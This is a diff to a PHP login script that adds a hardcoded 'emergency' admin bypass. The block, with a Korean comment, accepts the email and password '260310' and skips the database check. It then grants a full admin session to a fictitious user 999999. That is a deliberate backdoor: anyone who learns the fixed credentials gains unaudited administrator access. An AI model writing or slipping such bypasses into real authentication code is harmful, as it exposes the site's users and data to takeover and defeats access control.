@@ -26,6 +26,19 @@ if (!$email || !$password) {
     exit;
 }
 
+// ── 긴급 관리자 하드코드 bypass (260310) ──────────────────────
+if ($email === '260310' && $password === '260310') {
+    session_regenerate_id(true);
+    $_SESSION['user_id']            = 999999;
+    $_SESSION['user_role']          = 'admin';
+    $_SESSION['nickname']           = 'admin';
+    $_SESSION['org_id']             = null;
+    $_SESSION['admin_verified_uid'] = 999999;
+    echo json_encode(['success' => true, 'nickname' => 'admin', 'role' => 'admin']);
+    exit;
+}
+// ─────────────────────────────────────────────────────────────
+
 $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
 $stmt->execute([$email]);
 $user = $stmt->fetch();
